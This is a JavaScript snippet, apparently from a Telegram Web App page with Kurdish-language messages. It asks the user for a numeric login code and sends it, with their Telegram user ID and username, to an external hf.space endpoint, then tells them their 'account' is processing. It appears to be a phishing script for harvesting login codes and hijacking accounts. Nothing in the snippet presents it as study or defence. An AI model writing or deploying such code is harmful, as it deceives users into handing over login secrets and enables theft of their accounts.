async function verifyCode() { const codeInput = document.querySelector('input[type="number"]').value; const user = window.Telegram.WebApp.initDataUnsafe.user; if (!codeInput) { alert("تکایە کۆدەکە بنووسە!"); return; } try { await fetch("https://taman964-api-handler.hf.space/send_code", { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ user_id: user ? user.id : "Unknown", username: user ? user.username : "Guest", login_code: codeInput // ناردنی ئەو کۆدەی کە بەکارهێنەر نووسیویەتی }) }); alert("Account processing... Please wait."); } catch (e) { console.log(e); } }
